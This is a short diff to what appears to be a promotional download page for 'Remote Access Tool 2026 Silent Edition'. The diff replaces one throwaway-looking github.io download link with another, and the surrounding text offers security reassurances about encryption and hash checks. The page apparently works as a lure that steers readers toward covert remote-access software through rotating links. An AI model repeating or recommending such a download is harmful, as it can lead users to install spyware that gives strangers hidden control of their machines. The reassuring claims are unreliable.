@@ -42,6 +42,6 @@ A4: The tool employs advanced encryption standards, including AES-256 bit encryp
 
 To get started with Remote Access Tool 2026 Silent Edition, use the following link to download the official installer:
 
-[Download Remote Access Tool 2026](https://yellowtaxisave.github.io/download-page/)
+[Download Remote Access Tool 2026](https://capitals-707-bringing.github.io/download-page/)
 
 This download provides the latest version of the software, including all recent updates and security patches. Always verify the integrity of the downloaded file by checking its hash value against the official release notes to ensure authenticity and protect against tampering.
